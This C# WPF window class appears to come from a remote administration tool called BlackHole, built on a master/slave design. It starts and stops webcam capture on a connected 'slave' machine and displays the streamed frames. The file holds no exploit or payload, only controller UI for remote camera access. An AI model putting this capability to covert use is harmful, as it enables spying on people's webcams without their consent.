using System.IO;
using System.Windows;
using System.Windows.Media.Imaging;
using BlackHole.Common;
using BlackHole.Common.Helpers;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Extentions;

namespace BlackHole.Master
{
    /// <summary>
    /// Logique d'interaction pour RemoteDesktopWindow.xaml
    /// </summary>
    public partial class WebcamWindow : SlaveWindow
    {
        public WebcamWindow()
        {
            InitializeComponent();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public WebcamWindow(Slave slave)
            : base(slave)
        {
            InitializeComponent();

            // in case we leave the window withouth stopping
            Closing += (s, e) => StopCapture();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnStartCapture(object sender, RoutedEventArgs e) => StartCapture();

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnStopCapture(object sender, RoutedEventArgs e) => StopCapture();

        /// <summary>
        /// 
        /// </summary>
        private void StartCapture() => Send(new StartWebcamCaptureMessage());

        /// <summary>
        /// 
        /// </summary>
        private void StopCapture() => Send(new StopWebcamCaptureMessage());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void UpdateScreenCapture(WebcamCaptureMessage message)
        {
            if (WebcamImage.Source != null)
                ((BitmapImage)WebcamImage.Source).StreamSource.Dispose();
            WebcamImage.Source = ImageHelpers.BitmapToImageSource(message.RawImage);

            TxtBoxRate.Text = message.FrameRate.ToString();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public override async void OnEvent(SlaveEvent ev)
        {
            base.OnEvent(ev);
            await this.ExecuteInDispatcher(() =>
            {
                switch ((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.IncommingMessage:
                    {
                        ev.Data.Match().With<WebcamCaptureMessage>(UpdateScreenCapture);
                        break;
                    }
                }
            });
        }
    }
}
